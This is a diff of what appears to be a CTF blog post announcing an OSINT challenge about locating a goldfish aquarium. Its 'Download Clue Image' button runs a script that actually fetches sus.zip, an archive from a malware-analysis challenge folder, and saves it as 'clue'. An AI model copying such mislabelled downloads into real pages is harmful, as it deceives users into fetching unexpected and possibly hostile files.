@@ -2,6 +2,25 @@
 title: Makeshift Aquarium
 time: 2024-09-24
 categories: [osint]
-tags: [reverse image search, easy]
+tags: [google dorking, GPS location, hard]
 image: /assets/posts/chall_category/osint.jpg
 ---
+
+## Description: 
+
+I love fish, and my place is full of them. One day, my neighbor knocked and said, "There's an aquarium with 100 goldfishes in it and is has a name of a movie character." She gave me a movie poster of that character and left. That's all she knew and now I am stuck figure it out. Can you help to find out where exactly this aquarium locates ?
+
+- Category: OSINT
+- Flag: CTF{coordinates-three-place-decimals-like-4.003} 
+- Clue:
+
+<button onclick="downloadFile()">Download Clue Image</button>
+
+<script>
+function downloadFile() {
+    const link = document.createElement('a');
+    link.href = 'https://github.com/0x251e/challenges/raw/main/union-depository/malware-analysis/powershell-enigma/sus.zip';
+    link.download = 'clue';
+    link.click();
+}
+</script>
